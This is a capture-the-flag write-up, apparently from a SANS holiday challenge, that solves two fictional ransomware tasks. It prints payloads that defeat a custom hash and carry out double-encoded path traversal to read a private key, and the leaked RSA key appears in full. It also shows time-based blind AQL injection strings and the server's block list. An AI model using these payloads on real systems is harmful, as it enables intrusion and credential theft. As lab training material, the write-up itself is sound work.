    def update(self, file_bytes: bytes = None, filename_bytes: bytes = None, nonce_bytes: bytes = None):
        """Updates the internal state with new bytes and recomputes the hash."""
        if file_bytes is not None:
            self.file_bytes = file_bytes
        if filename_bytes is not None:
            self.filename_bytes = filename_bytes
        if nonce_bytes is not None:
            self.nonce_bytes = nonce_bytes

        self.hash_result = self._compute_hash()

    def validate(self, hex_string: str):
        """Validates if the provided hex string matches the computed hash."""
        try:
            decoded_bytes = binascii.unhexlify(hex_string)
            if decoded_bytes == self.digest():
                return True, None
        except Exception as e:
            stack_trace = traceback.format_exc()
            return False, f"{stack_trace}"
        return False, None
```

After looking over this file, its clear that it is a custom hashing function. Based on the naming convention of the inputs, it seems as though this function is taking input of a file, and a nonce to produce a digest, which is what we have been seeing in our url parameters and also what we modified to produce the error to get the path to this file.

The error that we produced by modifying the url path value following `/view/` was a "File not found" error. This seems as though the path value that we modified was actually a filename that the server was retrieving. Once we modified the value, the server was unable to find the file and so it produced the error. This means that we have the ability to set the filename that is given to this hashing function. If we can calculate a digest that matches the digest of a file we want to see on the server, we could potentially retrieve it. The only other item we need is the `nonce` which we have from the pcap file!

If you remember back in the Santa Vision challenge, we saw an interesting message in the frostbit feed.

`Let's Encrypt cert for api.frostbit.app verified. at path /etc/nginx/certs/api.frostbit.app.key`

Based on what we know now, this is likely the key that we can use to start the decryption. This will be the file we want to retrieve.

What we need to figure out now, is how can we create a hash for the file we want, that we can calculate beforehand to put in the digest. Since the output of the hash is based on the input of not only the filename, but also the file contents which we don't have access to, it seems impossible. But upon closer inspection of the hashing function, we find a vulnerability which lies in the `_compute_hash` function.

```python
def _compute_hash(self) -> bytes:
        hash_result = bytearray(self.hash_length)
        count = 0

        for i in range(len(self.file_bytes)):
            xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]
            hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd
            count += 1

        for i in range(len(self.filename_bytes)):
            count_mod = count % self.hash_length
            count_filename_mod = count % self.filename_bytes_length
            count_nonce_mod = count % self.nonce_bytes_length
            xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]
            hash_result[count_mod] = hash_result[count_mod] & xrd
            count += 1

        return bytes(hash_result)
```

The function first loops through the `file_bytes` logically XORing the `file_bytes` with the `nonce_bytes`. It does this for each byte and then saves the result in the `hash_result`. The function then does another loop, this time over the `filename_bytes`, logically XORing `filename_bytes` with `nonce_bytes`. The result of this is then logically ANDed with the hash result bytes from the first loop. The vulnerability is right there. The first loop produces some hash bytes through logical XOR. This is done through the use of the `file_bytes` which we have no influence over. Then the second loop does the same thing with the `filename_bytes` which IS something we can modify. The fact that this happens second is important because since the digest is only 16 bytes long, we just need to overwrite the hash bytes made from the `file_bytes` in the first loop and then we control the whole digest. Since `filename_bytes` is XORed with `nonce_bytes`, if we pass the nonce as the filename, the result of the nonce XORed with the nonce will produce bytes of `0`. Then when this value is ANDed with hash result of the first loop, it will produce all zeros as well. This means that we can produce an all zero digest no matter what the file contents. Then using local file inclusion (LFI) we can try and retrieve the key file we mentioned earlier. Let's start to build a url for this.

The format of the url we want to send will be as follows:
`https://api.frostbit.app/view/{statusid_filename}/{uuid}/status?digest=00000000000000000000000000000000&debug=true`

Now, since our digest is 16 bytes, we need our filename to also be 16 bytes to cancel it out. The nonce is 8 bytes long so we simply double it.

statusid_filename: `ec622b7c418bd0c1ec622b7c418bd0c1`

Now, to add our LFI, the path we would want is something like this `/../../../../../../etc/nginx/certs/api.frostbit.app.key`.

The problem with that is that if we just append that onto the end of the `statusid` filename we have, nginx and the server will simplify the path by removing all of the directory traversals and ultimately give us a 404 error saying the URL is not found. To get around this, we need to URL encode the data, not just once, but twice so that neither nginx nor the server simplify the path before it gets resolved.

Lets urlencode the statusid_filename first.

Filename: `ec622b7c418bd0c1ec622b7c418bd0c1`
Single URL Encoded: `%ec%62%2b%7c%41%8b%d0%c1%ec%62%2b%7c%41%8b%d0%c1`
Double URL Encoded: `%25ec%2562%252b%257c%2541%258b%25d0%25c1%25ec%2562%252b%257c%2541%258b%25d0%25c1`

Now the LFI path.

LFI: `/../../../../../../etc/nginx/certs/api.frostbit.app.key`
Single URL Encoded: `%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fnginx%2Fcerts%2Fapi%2Efrostbit%2Eapp%2Ekey`
Double URL Encoded: `%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey`

Now if we put it all together, it should look like this.

`https://api.frostbit.app/view/%25ec%2562%252b%257c%2541%258b%25d0%25c1%25ec%2562%252b%257c%2541%258b%25d0%25c1%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey/ae3ac150-d4c0-8b12-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true`

https://api.frostbit.app/view/%25ec%2562%252b%257c%2541%258b%25d0%25c1%25ec%2562%252b%257c%2541%258b%25d0%25c1%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true

Let's give it a try.

After sending the request, we see the following private key at the bottom of the webpage:

```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

Now, your first thought might be to try and decrypt the Naughty Nice List right away, but one of the hints we received should make you think of another option. 

Hint: *"Even after removing TLS, some values passed by the ransomware seem to be asymmetrically encrypted, possibly with PKI"*

Remember the `encryptedKey` value in the TLS traffic? That might be the real decryption key that was encrypted with this RSA key. Let's try and decrypt it using CyberChef. Firstly, we need to convert the encryptedKey hex data to binary. Do this with CyberChef as well with the recipe `From Hex` and the delimiter set to auto.

![Hex to binary](../images/frostbit_decrypt/hex_to_bin.png)

Now copy the binary output and paste it into the input. Switch the CyberChef recipe to `RSA Decrypt`, put the RSA private key in the correct input and set the encryption scheme to `RSAES-PKCS1-V1_5`.

![Decrypted key](../images/frostbit_decrypt/decrypted_key.png)

We have now decrypted the `encryptedKey`:

`9b07dc230a67bb341fb2d6ea401bcad0,7455047a01ea7c1a`

With a bit of research, I determined that this was a symmetric encryption key (likely AES) along with its initialization vector (IV). Let's use CyberChef again to try and decrypt the csv file with this key. Use the AES decrypt recipe, input the key and the iv and set the mode to CBC. CyberChef gives an error about the IV being too short, turns out its because the iv is in utf-8 encoding, not hex. The same turns out to be true for the key, so switch both of those over. Now open the encrypted CSV file with CyberChef's built in file browser and make sure Input and Output are both set to RAW. Once you do that, you should see the decrypted Naughty-Nice List!

![Naughty Nice List](../images/frostbit_decrypt/decrypted_list.png)

If you scroll all the way to the bottom of the file, we can see that the child at row 440 is named `Xena Xtreme`.

Answer: `Xena Xtreme`

Done!
## Deactivate the Frostbit Naughty-Nice List Publication
**Location:** The Front Yard (Act 3)
**NPC:** Tangle Coalbox
**Note:** This challenge uses the same assets as `Frostbit Decrypt`

*Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.*

If you remember the Santa Vision challenge, we saw the following message show up in the `frostbitfeed` topic:

`Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/<botuuid>/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley

It seems that Wombley was trying to deactivate the frostbit ransomware at the following endpoint:
`https://api.frostbit.app/api/v1/frostbitadmin/bot/<botuuid>/deactivate`

Since this is using the same domain and infrastructure as the previous challenge, let's set the query param `debug=true`. If it's anything like that challenge, we will find some extra error information because of it. 

Let's use postman to make some requests. If we send an http request to that endpoint, we get the following response back:

![Postman](../images/frostbit_deactivate/postman.png)

We need to find the right API-Key so we can deactivate the ransomware. Since the API-Key is a user set value, let's see if it's vulnerable to SQL injection. Send it an http request with just one single quote to see if it produces an error:

```
{
	"debug": true,
	"error": "Timeout or error in query:\nFOR doc IN config\n FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n <other_query_lines_omitted>\n RETURN doc"
}
```

Perfect! It is vulnerable to injection. I do not recognize the syntax returned in the error statement. Let's see if we can figure out what kind of database this is. I gave ChatGPT the full error and asked it what kind of database it thought it was. It responded that it was likely `ArangoDB`. I checked out the ArangoDB website, and sure enough the syntax was a match.

If we look at the error message we were returned, we can see that the database is checking our provided value with a value in the database to see if it matches. Since the name of the value in the database is omitted from the error message, we cannot simply add our own key to the database. We first need to figure out what the name is so we know where to add our own. I turned to the [ArangoDB documentation](https://docs.arangodb.com/stable/) to search for options.

After trying many different options with the ArangoDB syntax, I found that the following strings all produced a `Request Blocked` error when sent in the API key value.

Blocked:
```
;
return
\`
\n
/
*
values
insert
merge
update
unset
for
with
STARTS_WITH
```

Another thing to note, is that the error messages produced do not return any extra data from the query. This means we are using a blind injection point. Even though we can't visually see the exact data we are querying, there are various techniques for blind SQL injection attacks. See the following article for a good list.

https://owasp.org/www-community/attacks/Blind_SQL_Injection

One of the most common blind SQL injection methods, is to use a SLEEP query in your statement. If the statement executes correctly, you should see a delay in the response. If not, then there must have been an error. Let's see if we can get something working.

The ArangoDB `sleep` function seems to work, but the query will time out at 2 seconds and send back the following error:

```
{
	"debug": true,
	"error": "Timeout or error in query:\nFOR doc IN config\n FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n <other_query_lines_omitted>\n RETURN doc"
}
```

This means we can sleep for a maximum of 1.9s before it times out and gives us that generic error. Also, we need to set the last comparison in our statement to resolve to false for the sleep to work. This is because with an OR statement, if one equivalency check succeeds, then the whole statement succeeds. If we set the last comparison to '1'='1 then it will evaluate to true and skip the sleep statement. But if we set '1'='2 it will evaluate to false and force the sleep statement to complete to check its result in the comparison. 

`'OR sleep(1.9)==null OR '1'=='2   --> Delays for 1.9 seconds.

This also means that we can add in a comparison check that we want to know with an OR, and if there is a delay of 1.9 seconds, it means that it evaluated to false. But if the query executes with no delay it means that the comparison resolved to true. Lets see how we can make use of that.

If we use the `LENGTH` function in ArangoDB, we can try and determine how many attributes the `doc` has.

By doing the following queries I can figure out how many attributes there are.
`'OR LENGTH(doc)>0 OR sleep(1.9)==null OR '1'=='2` --> DELAY (NOT TRUE)
`'OR LENGTH(doc)>10 OR sleep(1.9)==null OR '1'=='2` --> DELAY (NOT TRUE)
`'OR LENGTH(doc)>4 OR sleep(1.9)==null OR '1'=='2` --> DELAY (NOT TRUE)
`'OR LENGTH(doc)==4 OR sleep(1.9)==null OR '1'=='2` --> NO DELAY (TRUE)

So basically we found that there are 4 attributes in each doc. Based on ChatGPT's knowledge, they should be the following attributes of which the first 3 are default to every item in ArangoDB.
- `_id`
- `_key`
- `_rev`
- {mystery api key attribute}

We now need to figure out what the API key attribute is called.
Maybe we can get the length of it somehow and guess from there.

We can use the following query to get the length of the mystery attribute. `ATTRIBUTES` get all the attributes of an item, then `NTH` gets the nth item of that attribute array. Finally `CHAR_LENGTH` gets the number of characters in the attribute's name. We can do a few comparisons to narrow down the actual length.

`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),1))==4 OR sleep(1.9)==null OR '1'=='2` (DELAY)
`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),1))>20 OR sleep(1.9)==null OR '1'=='2` (DELAY)
`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),0))==18 OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

The above queries determined that the attribute has a length of 18 characters. My first guess was `frostbit_x_api_key` but it didnt work :(

I even tried through all of the following combinations before deciding I had to change my methods:

```
frostbit_x_api_key
Frostbit_X_Api_Key
FROSTBIT_X_API_KEY
frostbit-x-api-key
Frostbit-X-Api-Key
FROSTBIT-X-API-KEY
x_api_key_frostbit
X_Api_Key_Frostbit
X_API_KEY_FROSTBIT
x-api-key-frostbit
X-Api-Key-Frostbit
X-API-KEY-FROSTBIT

Frostbit-x-api-key
frostbit-X-api-key
frostbit-x-Api-key
frostbit-x-api-Key
Frostbit-X-api-key
Frostbit-X-Api-key
frostbit-X-Api-Key
frostbit-x-Api-Key
frostbit-X-API-KEY
-
Frostbit_x_api_key
frostbit_X_api_key
frostbit_x_Api_key
frostbit_x_api_Key
Frostbit_X_api_key
Frostbit_X_Api_key
frostbit_X_Api_Key
frostbit_x_Api_Key
frostbit_X_API_KEY
```

After looking through the ArangoDB documentation once more, I found the `CONTAINS` function which can check if a string contains another string. 

`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "key") OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "_api_key") OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "deactivate_api_key") OR sleep(1.9)==null OR '1'=='2` --> (NO DELAY)

With that function and a couple good assumptions, we now determined the attribute name of the api key;

`deactivate_api_key`

What would be a great next step would be to now add your own API key to the database now that we know its attribute name. The issue with this is that all of the useful data modification queries in ArangoDB (INSERT, UPDATE, MERGE) are blocked in the requests. So this leaves us with one clear option. Enumerate the API key value. We already did it for the attribute name, so we can do it for the value. Lets start with finding out the length

`'OR CHAR_LENGTH(doc.deactivate_api_key)>5 OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

`'OR CHAR_LENGTH(doc.deactivate_api_key)>20 OR sleep(1.9)==null OR '1'=='2` (NO DELAY) 

`'OR CHAR_LENGTH(doc.deactivate_api_key)>40 OR sleep(1.9)==null OR '1'=='2` (DELAY)

`'OR CHAR_LENGTH(doc.deactivate_api_key)==36 OR sleep(1.9)==null OR '1'=='2` (DELAY)

Damn so the API key is 36 characters long. This is going to be fun. Using the `SUBSTRING` function, I decided to determine which of all the characters existed within the API key. That way, each time we try and enumerate a new character, we are only checking each character that could actually exist within the string.

For example, the following query would determine if the character "a" exists within the api key value:

`'OR SUBSTRING(doc.deactivate_api_key, 0, 1)=="a" OR sleep(1.9)==null OR '1'=='2`

This query did not execute a delay, meaning the character "a" does exist in the api key. Through this same method, I determined that the following characters made up the api key:

```
a
b
c
d
e
f
1
2
4
5
6
7
9
0
-
```

All of these are hex characters, except the hyphen. This combined with the 36 character length makes it clear that this is a UUID. Let's enumerating the api key. Every time we find a new character, we increment the length in the `SUBSTRING` function and move onto finding the next character.

After a while, I was getting close:

`'OR SUBSTRING(doc.deactivate_api_key, 0, 14)=="abe7a6ad-715e-" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

`'OR SUBSTRING(doc.deactivate_api_key, 0, 19)=="abe7a6ad-715e-4e6a-" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

`'OR SUBSTRING(doc.deactivate_api_key, 0, 26)=="abe7a6ad-715e-4e6a-901b-c9" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

`'OR SUBSTRING(doc.deactivate_api_key, 0, 30)=="abe7a6ad-715e-4e6a-901b-c9279a" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

`'OR SUBSTRING(doc.deactivate_api_key, 0, 32)=="abe7a6ad-715e-4e6a-901b-c9279a96" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

`'OR SUBSTRING(doc.deactivate_api_key, 0, 35)=="abe7a6ad-715e-4e6a-901b-c9279a964f9" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

`'OR SUBSTRING(doc.deactivate_api_key, 0, 36)=="abe7a6ad-715e-4e6a-901b-c9279a964f91" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)

Finally, we found the 36 character api key:

deactivate_api_key: `abe7a6ad-715e-4e6a-901b-c9279a964f91`

Once we sent it to the API, we got the following response.

![deactivated](../images/frostbit_deactivate/deactivated.png)

If we return to the ransomeware web page, we find that the status has been switched to deactivated there as well.

![Deactivated webpage](../images/frostbit_deactivate/status_deactivated.png)

Christmas is saved!

Thank you to SANS! I enjoy this every year!